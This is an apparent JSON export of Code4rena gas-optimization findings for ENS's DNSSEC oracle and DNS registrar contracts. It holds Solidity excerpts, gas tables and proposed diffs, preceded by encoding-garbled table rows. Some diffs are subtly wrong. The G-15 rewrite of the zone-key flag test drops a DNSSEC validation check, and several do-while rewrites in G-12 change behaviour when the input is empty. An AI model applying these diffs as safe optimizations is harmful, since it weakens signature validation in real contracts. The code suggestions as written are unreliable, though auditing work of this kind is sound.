â”‚\nÂ·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·\n|  PublicResolver          Â·  setName                    Â·          -  Â·          -  Â·       55359  Â·           22  Â·          -  â”‚\nÂ·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·\n|  PublicResolver          Â·  setText                    Â·          -  Â·          -  Â·       57629  Â·           22  Â·          -  â”‚\nÂ·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·\n|  ReverseRegistrar        Â·  claim                      Â·      60960  Â·      60972  Â·       60966  Â·           44  Â·          -  â”‚\nÂ·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·\n|  Root                    Â·  setController              Â·          -  Â·          -  Â·       47813  Â·           30  Â·          -  â”‚\nÂ·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·\n|  Root                    Â·  setSubnodeOwner            Â·          -  Â·          -  Â·       58638  Â·            1  Â·          -  â”‚\nÂ·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·\n|  SimplePublicSuffixList  Â·  addPublicSuffixes          Â·      47573  Â·      71045  Â·       68810  Â·           21  Â·          -  â”‚\nÂ·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·|Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·\n```\n\n**[Arachnid (ENS) acknowledged](https://github.com/code-423n4/2023-04-ens-findings/issues/220#issuecomment-1536271298)**\n\n\n\n***\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21919",
      "title": "[G-15] `If` statements that use `&` can be refactored into nested `if` statements",
      "impact": "GAS",
      "content": "\nhttps://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnssec-oracle/DNSSECImpl.sol#L312-L314\n\n*Gas Savings for `DNSRegistrar.proveAndClaimWithResolver`, obtained via protocol's tests: Avg 64 gas* \n\n|        |    Min   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  301464  |  339399  |  320432 |    2     |\n| After  |  301400  |  339335  |  320368 |    2     |\n\n```solidity\nFile: contracts/dnssec-oracle/DNSSECImpl.sol\n312:        if (dnskey.flags & DNSKEY_FLAG_ZONEKEY == 0) {\n313:            return false;\n314:        }\n```\n```diff\ndiff --git a/contracts/dnssec-oracle/DNSSECImpl.sol b/contracts/dnssec-oracle/DNSSECImpl.sol\nindex a3e4e5f..e442944 100644\n--- a/contracts/dnssec-oracle/DNSSECImpl.sol\n+++ b/contracts/dnssec-oracle/DNSSECImpl.sol\n@@ -309,8 +309,10 @@ contract DNSSECImpl is DNSSEC, Owned {\n         // o The matching DNSKEY RR MUST be present in the zone's apex DNSKEY\n         //   RRset, and MUST have the Zone Flag bit (DNSKEY RDATA Flag bit 7)\n         //   set.\n-        if (dnskey.flags & DNSKEY_FLAG_ZONEKEY == 0) {\n-            return false;\n+        if (dnskey.flags == 0) {\n+            if (DNSKEY_FLAG_ZONEKEY == 0) {\n+                return false;\n+            }\n         }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21918",
      "title": "[G-14] Refactor code to avoid instantiating memory struct within loop",
      "impact": "GAS",
      "content": "In the instance below, instead of instantiating the `SignedSets` struct within memory in the loop we can refactor the `validateSignedSet` function so that only the needed struct values are returned and used in the loop.\n\nhttps://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnssec-oracle/DNSSECImpl.sol#L118-L174\n\n*Gas Savings for `DNSRegistrar.proveAndClaimWithResolver`, obtained via protocol's tests: Avg 322 gas* \n\n|        |    Min   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  301464  |  339399  |  320432 |    2     |\n| After  |  301142  |  339077  |  320110 |    2     |\n\n```solidity\nFile: contracts/dnssec-oracle/DNSSECImpl.sol\n118:        for (uint256 i = 0; i < input.length; i++) {\n119:            RRUtils.SignedSet memory rrset = validateSignedSet(\n120:                input[i],\n121:                proof,\n122:                now\n123:            );\n124:            proof = rrset.data;\n125:            inception = rrset.inception;\n126:        }\n\n140:    function validateSignedSet(\n141:        RRSetWithSignature memory input,\n142:        bytes memory proof,\n143:        uint256 now\n144:    ) internal view returns (RRUtils.SignedSet memory rrset) {\n145:        rrset = input.rrset.readSignedSet();\n\n173:        return rrset;\n```\n```diff\ndiff --git a/contracts/dnssec-oracle/DNSSECImpl.sol b/contracts/dnssec-oracle/DNSSECImpl.sol\nindex a3e4e5f..a6a184c 100644\n--- a/contracts/dnssec-oracle/DNSSECImpl.sol\n+++ b/contracts/dnssec-oracle/DNSSECImpl.sol\n@@ -116,13 +116,13 @@ contract DNSSECImpl is DNSSEC, Owned {\n     {\n         bytes memory proof = anchors;\n         for (uint256 i = 0; i < input.length; i++) {\n-            RRUtils.SignedSet memory rrset = validateSignedSet(\n+            (bytes memory rrsetData, uint32 rrsetInception) = validateSignedSet(\n                 input[i],\n                 proof,\n                 now\n             );\n-            proof = rrset.data;\n-            inception = rrset.inception;\n+            proof = rrsetData;\n+            inception = rrsetInception;\n         }\n         return (proof, inception);\n     }\n@@ -141,8 +141,8 @@ contract DNSSECImpl is DNSSEC, Owned {\n         RRSetWithSignature memory input,\n         bytes memory proof,\n         uint256 now\n-    ) internal view returns (RRUtils.SignedSet memory rrset) {\n-        rrset = input.rrset.readSignedSet();\n+    ) internal view returns (bytes memory, uint32) {\n+        RRUtils.SignedSet memory rrset = input.rrset.readSignedSet();\n\n         // Do some basic checks on the RRs and extract the name\n         bytes memory name = validateRRs(rrset, rrset.typeCovered);\n@@ -170,7 +170,7 @@ contract DNSSECImpl is DNSSEC, Owned {\n         // Validate the signature\n         verifySignature(name, rrset, input, proof);\n\n-        return rrset;\n+        return (rrset.data, rrset.inception);\n     }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21917",
      "title": "[G-13] Don't cache value if it is only used once",
      "impact": "GAS",
      "content": "If a value is only intended to be used once then it should not be cached. Caching the value will result in unnecessary stack manipulation.\n\nhttps://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnssec-oracle/DNSSECImpl.sol#L304-L307\n\n*Gas Savings for `DNSRegistrar.proveAndClaimWithResolver`, obtained via protocol's tests: Avg 90 gas* \n\n|        |    Min   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  301464  |  339399  |  320432 |    2     |\n| After  |  301374  |  339309  |  320342 |    2     |\n\n```solidity\nFile: contracts/dnssec-oracle/DNSSECImpl.sol\n304:        uint16 computedkeytag = keyrdata.computeKeytag();\n305:        if (computedkeytag != rrset.keytag) {\n306:            return false;\n307:        }\n```\n```diff\ndiff --git a/contracts/dnssec-oracle/DNSSECImpl.sol b/contracts/dnssec-oracle/DNSSECImpl.sol\nindex a3e4e5f..c6c03fc 100644\n--- a/contracts/dnssec-oracle/DNSSECImpl.sol\n+++ b/contracts/dnssec-oracle/DNSSECImpl.sol\n@@ -301,8 +301,7 @@ contract DNSSECImpl is DNSSEC, Owned {\n         if (dnskey.algorithm != rrset.algorithm) {\n             return false;\n         }\n-        uint16 computedkeytag = keyrdata.computeKeytag();\n-        if (computedkeytag != rrset.keytag) {\n+        if (keyrdata.computeKeytag() != rrset.keytag) {\n             return false;\n         }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21916",
      "title": "[G-12] Use a `do while` loop instead of a `for` loop",
      "impact": "GAS",
      "content": "A `do while` loop will cost less gas since the condition is not being checked for the first iteration.\n\n**Note: Other optimizations, such as caching length, precrementing, and using unchecked blocks are not included in the Diff since they are included in the automated findings report.**\n\nTotal Instances: `8`\n\nhttps://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnssec-oracle/DNSSECImpl.sol#L118-L126\n\n*Gas Savings for `DNSRegistrar.proveAndClaimWithResolver`, obtained via protocol's tests: Avg 60 gas* \n\n|        |    Min   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  301464  |  339399  |  320432 |    2     |\n| After  |  301404  |  339339  |  320372 |    2     |\n\n```solidity\nFile: contracts/dnssec-oracle/DNSSECImpl.sol\n118:        for (uint256 i = 0; i < input.length; i++) {\n119:            RRUtils.SignedSet memory rrset = validateSignedSet(\n120:                input[i],\n121:                proof,\n122:                now\n123:            );\n124:            proof = rrset.data;\n125:            inception = rrset.inception;\n126:        }\n```\n```diff\ndiff --git a/contracts/dnssec-oracle/DNSSECImpl.sol b/contracts/dnssec-oracle/DNSSECImpl.sol\nindex a3e4e5f..c30d8ba 100644\n--- a/contracts/dnssec-oracle/DNSSECImpl.sol\n+++ b/contracts/dnssec-oracle/DNSSECImpl.sol\n@@ -115,7 +115,8 @@ contract DNSSECImpl is DNSSEC, Owned {\n         returns (bytes memory rrs, uint32 inception)\n     {\n         bytes memory proof = anchors;\n-        for (uint256 i = 0; i < input.length; i++) {\n+        uint256 i;\n+        do {\n             RRUtils.SignedSet memory rrset = validateSignedSet(\n                 input[i],\n                 proof,\n@@ -123,7 +124,8 @@ contract DNSSECImpl is DNSSEC, Owned {\n             );\n             proof = rrset.data;\n             inception = rrset.inception;\n-        }\n+            i++;\n+        } while (i < input.length);\n         return (proof, inception);\n     }\n```\n\nhttps://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnssec-oracle/DNSSECImpl.sol#L260-L274\n\n*Gas Savings for `DNSRegistrar.proveAndClaimWithResolver`, obtained via protocol's tests: Avg 62 gas* \n\n|        |    Min   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  301464  |  339399  |  320432 |    2     |\n| After  |  301402  |  339337  |  320370 |    2     |\n\n```solidity\nFile: contracts/dnssec-oracle/DNSSECImpl.sol\n260:        for (; !proof.done(); proof.next()) {\n261:            bytes memory proofName = proof.name();\n262:            if (!proofName.equals(rrset.signerName)) {\n263:                revert ProofNameMismatch(rrset.signerName, proofName);\n264:            }\n265:\n266:            bytes memory keyrdata = proof.rdata();\n267:            RRUtils.DNSKEY memory dnskey = keyrdata.readDNSKEY(\n268:                0,\n269:                keyrdata.length\n270:            );\n271:            if (verifySignatureWithKey(dnskey, keyrdata, rrset, data)) {\n272:                return;\n273:            }\n274:        }\n```\n```diff\ndiff --git a/contracts/dnssec-oracle/DNSSECImpl.sol b/contracts/dnssec-oracle/DNSSECImpl.sol\nindex a3e4e5f..a357e70 100644\n--- a/contracts/dnssec-oracle/DNSSECImpl.sol\n+++ b/contracts/dnssec-oracle/DNSSECImpl.sol\n@@ -257,7 +257,7 @@ contract DNSSECImpl is DNSSEC, Owned {\n         RRUtils.RRIterator memory proof\n     ) internal view {\n         // Check the DNSKEY's owner name matches the signer name on the RRSIG\n-        for (; !proof.done(); proof.next()) {\n+        do {\n             bytes memory proofName = proof.name();\n             if (!proofName.equals(rrset.signerName)) {\n                 revert ProofNameMismatch(rrset.signerName, proofName);\n@@ -271,7 +271,9 @@ contract DNSSECImpl is DNSSEC, Owned {\n             if (verifySignatureWithKey(dnskey, keyrdata, rrset, data)) {\n                 return;\n             }\n-        }\n+            proof.next();\n+        } while (!proof.done());\n+\n         revert NoMatchingProof(rrset.signerName);\n     }\n```\n\nhttps://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnssec-oracle/DNSSECImpl.sol#L181-L213\n\n*Gas Savings for `DNSRegistrar.proveAndClaimWithResolver`, obtained via protocol's tests: Avg 140 gas* \n\n|        |    Min   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  301464  |  339399  |  320432 |    2     |\n| After  |  301324  |  339259  |  320292 |    2     |\n\n```solidity\nFile: contracts/dnssec-oracle/DNSSECImpl.sol\n181:    function validateRRs(\n182:        RRUtils.SignedSet memory rrset,\n183:        uint16 typecovered\n184:    ) internal pure returns (bytes memory name) {\n185:        // Iterate over all the RRs\n186:        for (\n187:            RRUtils.RRIterator memory iter = rrset.rrs();\n188:            !iter.done();\n189:            iter.next()\n190:        ) {\n191:            // We only support class IN (Internet)\n192:            if (iter.class != DNSCLASS_IN) {\n193:                revert InvalidClass(iter.class);\n194:            }\n195:\n196:            if (name.length == 0) {\n197:                name = iter.name();\n198:            } else {\n199:                // Name must be the same on all RRs. We do things this way to avoid copying the name\n200:                // repeatedly.\n201:                if (\n202:                    name.length != iter.data.nameLength(iter.offset) ||\n203:                    !name.equals(0, iter.data, iter.offset, name.length)\n204:                ) {\n205:                    revert InvalidRRSet();\n206:                }\n207:            }\n208:\n209:            // o  The RRSIG RR's Type Covered field MUST equal the RRset's type.\n210:            if (iter.dnstype != typecovered) {\n211:                revert SignatureTypeMismatch(iter.dnstype, typecovered);\n212:            }\n213:        }\n```\n```diff\ndiff --git a/contracts/dnssec-oracle/DNSSECImpl.sol b/contracts/dnssec-oracle/DNSSECImpl.sol\nindex a3e4e5f..f09438a 100644\n--- a/contracts/dnssec-oracle/DNSSECImpl.sol\n+++ b/contracts/dnssec-oracle/DNSSECImpl.sol\n@@ -183,11 +183,8 @@ contract DNSSECImpl is DNSSEC, Owned {\n         uint16 typecovered\n     ) internal pure returns (bytes memory name) {\n         // Iterate over all the RRs\n-        for (\n-            RRUtils.RRIterator memory iter = rrset.rrs();\n-            !iter.done();\n-            iter.next()\n-        ) {\n+        RRUtils.RRIterator memory iter = rrset.rrs();\n+        do {\n             // We only support class IN (Internet)\n             if (iter.class != DNSCLASS_IN) {\n                 revert InvalidClass(iter.class);\n@@ -210,7 +207,8 @@ contract DNSSECImpl is DNSSEC, Owned {\n             if (iter.dnstype != typecovered) {\n                 revert SignatureTypeMismatch(iter.dnstype, typecovered);\n             }\n-        }\n+            iter.next();\n+        } while (!iter.done());\n     }\n```\n\nhttps://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnssec-oracle/DNSSECImpl.sol#L330-L361\n\n*Gas Savings for `DNSRegistrar.proveAndClaimWithResolver`, obtained via protocol's tests: Avg 68 gas* \n\n|        |    Min   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  301464  |  339399  |  320432 |    2     |\n| After  |  301396  |  339331  |  320364 |    2     |\n\n```solidity\nFile: contracts/dnssec-oracle/DNSSECImpl.sol\n330:    function verifyWithDS(\n331:        RRUtils.SignedSet memory rrset,\n332:        RRSetWithSignature memory data,\n333:        RRUtils.RRIterator memory proof\n334:    ) internal view {\n335:        uint256 proofOffset = proof.offset;\n336:        for (\n337:            RRUtils.RRIterator memory iter = rrset.rrs();\n338:            !iter.done();\n339:            iter.next()\n340:        ) {\n341:            if (iter.dnstype != DNSTYPE_DNSKEY) {\n342:                revert InvalidProofType(iter.dnstype);\n343:            }\n344:\n345:            bytes memory keyrdata = iter.rdata();\n346:            RRUtils.DNSKEY memory dnskey = keyrdata.readDNSKEY(\n347:                0,\n348:                keyrdata.length\n349:            );\n350:            if (verifySignatureWithKey(dnskey, keyrdata, rrset, data)) {\n351:                // It's self-signed - look for a DS record to verify it.\n352:                if (\n353:                    verifyKeyWithDS(rrset.signerName, proof, dnskey, keyrdata)\n354:                ) {\n355:                    return;\n356:                }\n357:                // Rewind proof iterator to the start for the next loop iteration.\n358:                proof.nextOffset = proofOffset;\n359:                proof.next();\n360:            }\n361:        }\n```\n```diff\ndiff --git a/contracts/dnssec-oracle/DNSSECImpl.sol b/contracts/dnssec-oracle/DNSSECImpl.sol\nindex a3e4e5f..66cc74e 100644\n--- a/contracts/dnssec-oracle/DNSSECImpl.sol\n+++ b/contracts/dnssec-oracle/DNSSECImpl.sol\n@@ -333,11 +333,8 @@ contract DNSSECImpl is DNSSEC, Owned {\n         RRUtils.RRIterator memory proof\n     ) internal view {\n         uint256 proofOffset = proof.offset;\n-        for (\n-            RRUtils.RRIterator memory iter = rrset.rrs();\n-            !iter.done();\n-            iter.next()\n-        ) {\n+        RRUtils.RRIterator memory iter = rrset.rrs();\n+        do {\n             if (iter.dnstype != DNSTYPE_DNSKEY) {\n                 revert InvalidProofType(iter.dnstype);\n             }\n@@ -358,7 +355,8 @@ contract DNSSECImpl is DNSSEC, Owned {\n                 proof.nextOffset = proofOffset;\n                 proof.next();\n             }\n-        }\n+            iter.next();\n+        } while (!iter.done());\n         revert NoMatchingProof(rrset.signerName);\n     }\n```\n\nhttps://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnssec-oracle/DNSSECImpl.sol#L373-L404\n\n*Gas Savings for `DNSRegistrar.proveAndClaimWithResolver`, obtained via protocol's tests: Avg 68 gas* \n\n|        |    Min   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  301464  |  339399  |  320432 |    2     |\n| After  |  301396  |  339331  |  320364 |    2     |\n\n```solidity\nFile: contracts/dnsssec-oracle/DNSSECImpl.sol\n373:    function verifyKeyWithDS(\n374:        bytes memory keyname,\n375:        RRUtils.RRIterator memory dsrrs,\n376:        RRUtils.DNSKEY memory dnskey,\n377:        bytes memory keyrdata\n378:    ) internal view returns (bool) {\n379:        uint16 keytag = keyrdata.computeKeytag();\n380:        for (; !dsrrs.done(); dsrrs.next()) {\n381:            bytes memory proofName = dsrrs.name();\n382:            if (!proofName.equals(keyname)) {\n383:                revert ProofNameMismatch(keyname, proofName);\n384:            }\n385:\n386:            RRUtils.DS memory ds = dsrrs.data.readDS(\n387:                dsrrs.rdataOffset,\n388:                dsrrs.nextOffset - dsrrs.rdataOffset\n389:            );\n390:            if (ds.keytag != keytag) {\n391:                continue;\n392:            }\n393:            if (ds.algorithm != dnskey.algorithm) {\n394:                continue;\n395:            }\n396:\n397:            Buffer.buffer memory buf;\n398:            buf.init(keyname.length + keyrdata.length);\n399:            buf.append(keyname);\n400:            buf.append(keyrdata);\n401:            if (verifyDSHash(ds.digestType, buf.buf, ds.digest)) {\n402:                return true;\n403:            }\n404:        }\n```\n```diff\ndiff --git a/contracts/dnssec-oracle/DNSSECImpl.sol b/contracts/dnssec-oracle/DNSSECImpl.sol\nindex a3e4e5f..ed1c137 100644\n--- a/contracts/dnssec-oracle/DNSSECImpl.sol\n+++ b/contracts/dnssec-oracle/DNSSECImpl.sol\n@@ -377,7 +377,7 @@ contract DNSSECImpl is DNSSEC, Owned {\n         bytes memory keyrdata\n     ) internal view returns (bool) {\n         uint16 keytag = keyrdata.computeKeytag();\n-        for (; !dsrrs.done(); dsrrs.next()) {\n+        do {\n             bytes memory proofName = dsrrs.name();\n             if (!proofName.equals(keyname)) {\n                 revert ProofNameMismatch(keyname, proofName);\n@@ -388,9 +388,11 @@ contract DNSSECImpl is DNSSEC, Owned {\n                 dsrrs.nextOffset - dsrrs.rdataOffset\n             );\n             if (ds.keytag != keytag) {\n+                dsrrs.next();\n                 continue;\n             }\n             if (ds.algorithm != dnskey.algorithm) {\n+                dsrrs.next();\n                 continue;\n             }\n\n@@ -401,7 +403,8 @@ contract DNSSECImpl is DNSSEC, Owned {\n             if (verifyDSHash(ds.digestType, buf.buf, ds.digest)) {\n                 return true;\n             }\n-        }\n+            dsrrs.next();\n+        } while (!dsrrs.done());\n         return false;\n     }\n```\n\nhttps://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnsregistrar/DNSClaimChecker.sol#L29-L40\n\n*Gas Savings for `DNSRegistrar.proveAndClaimWithResolver`, obtained via protocol's tests: Avg 42 gas* \n\n|        |    Min   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  301464  |  339399  |  320432 |    2     |\n| After  |  301422  |  339357  |  320390 |    2     |\n\n```solidity\nFile: contracts/dnsregistrar/DNSClaimChecker.sol\n29:        for (\n30:            RRUtils.RRIterator memory iter = data.iterateRRs(0);\n31:            !iter.done();\n32:            iter.next()\n33:        ) {\n34:            if (iter.name().compareNames(buf.buf) != 0) continue;\n35:            bool found;\n36:            address addr;\n37:            (addr, found) = parseRR(data, iter.rdataOffset, iter.nextOffset);\n38:            if (found) {\n39:                return (addr, true);\n40:            }\n```\n```diff\ndiff --git a/contracts/dnsregistrar/DNSClaimChecker.sol b/contracts/dnsregistrar/DNSClaimChecker.sol\nindex 54950d1..7848671 100644\n--- a/contracts/dnsregistrar/DNSClaimChecker.sol\n+++ b/contracts/dnsregistrar/DNSClaimChecker.sol\n@@ -26,19 +26,20 @@ library DNSClaimChecker {\n         buf.append(\"\\x04_ens\");\n         buf.append(name);\n\n-        for (\n-            RRUtils.RRIterator memory iter = data.iterateRRs(0);\n-            !iter.done();\n-            iter.next()\n-        ) {\n-            if (iter.name().compareNames(buf.buf) != 0) continue;\n+        RRUtils.RRIterator memory iter = data.iterateRRs(0);\n+        do {\n+            if (iter.name().compareNames(buf.buf) != 0) {\n+                iter.next();\n+                continue;\n+            }\n             bool found;\n             address addr;\n             (addr, found) = parseRR(data, iter.rdataOffset, iter.nextOffset);\n             if (found) {\n                 return (addr, true);\n             }\n-        }\n+            iter.next();\n+        } while (!iter.done());\n\n         return (address(0x0), false);\n     }\n```\n\nhttps://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnsregistrar/DNSClaimChecker.sol#L46-L61\n\n*Gas Savings for `DNSRegistrar.proveAndClaimWithResolver`, obtained via protocol's tests: Avg 36 gas* \n\n|        |    Min   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  301464  |  339399  |  320432 |    2     |\n| After  |  301428  |  339363  |  320396 |    2     |\n\n```solidity\nFile: contracts/dnsregistrar/DNSClaimChecker.sol\n46:    function parseRR(\n47:        bytes memory rdata,\n48:        uint256 idx,\n49:        uint256 endIdx\n50:    ) internal pure returns (address, bool) {\n51:        while (idx < endIdx) {\n52:            uint256 len = rdata.readUint8(idx);\n53:            idx += 1;\n54:\n55:            bool found;\n56:            address addr;\n57:            (addr, found) = parseString(rdata, idx, len);\n58:\n59:            if (found) return (addr, true);\n60:            idx += len;\n61:        }\n```\n```diff\ndiff --git a/contracts/dnsregistrar/DNSClaimChecker.sol b/contracts/dnsregistrar/DNSClaimChecker.sol\nindex 54950d1..55bb5d2 100644\n--- a/contracts/dnsregistrar/DNSClaimChecker.sol\n+++ b/contracts/dnsregistrar/DNSClaimChecker.sol\n@@ -48,9 +48,9 @@ library DNSClaimChecker {\n         uint256 idx,\n         uint256 endIdx\n     ) internal pure returns (address, bool) {\n-        while (idx < endIdx) {\n+        do {\n             uint256 len = rdata.readUint8(idx);\n-            idx += 1;\n+            ++idx;\n\n             bool found;\n             address addr;\n@@ -58,7 +58,7 @@ library DNSClaimChecker {\n\n             if (found) return (addr, true);\n             idx += len;\n-        }\n+        } while (idx < endIdx);\n\n         return (address(0x0), false);\n     }\n```\n\nhttps://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnssec-oracle/RRUtils.sol#L384-L399\n\n*Gas Savings for `DNSRegistrar.proveAndClaimWithResolver`, obtained via protocol's tests: Avg 406 gas* \n\n|        |    Min   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  301464  |  339399  |  320432 |    2     |\n| After  |  301072  |  339007  |  320026 |    2     |\n\n```solidity\nFile: contracts/dnssec-oracle/RRUtils.sol\n384:            for (uint256 i = 0; i < data.length + 31; i += 32) {\n385:                uint256 word;\n386:                assembly {\n387:                    word := mload(add(add(data, 32), i))\n388:                }\n389:                if (i + 32 > data.length) {\n390:                    uint256 unused = 256 - (data.length - i) * 8;\n391:                    word = (word >> unused) << unused;\n392:                }\n393:                ac1 +=\n394:                    (word &\n395:                        0xFF00FF00FF00FF00FF00FF00FF00FF00FF00FF00FF00FF00FF00FF00FF00FF00) >>\n396:                    8;\n397:                ac2 += (word &\n398:                    0x00FF00FF00FF00FF00FF00FF00FF00FF00FF00FF00FF00FF00FF00FF00FF00FF);\n399:            }\n```\n```diff\ndiff --git a/contracts/dnssec-oracle/RRUtils.sol b/contracts/dnssec-oracle/RRUtils.sol\nindex 20fbf15..e9309d6 100644\n--- a/contracts/dnssec-oracle/RRUtils.sol\n+++ b/contracts/dnssec-oracle/RRUtils.sol\n@@ -381,13 +381,15 @@ library RRUtils {\n             require(data.length <= 8192, \"Long keys not permitted\");\n             uint256 ac1;\n             uint256 ac2;\n-            for (uint256 i = 0; i < data.length + 31; i += 32) {\n+            uint256 length = data.length;\n+            uint256 i;\n+            do {\n                 uint256 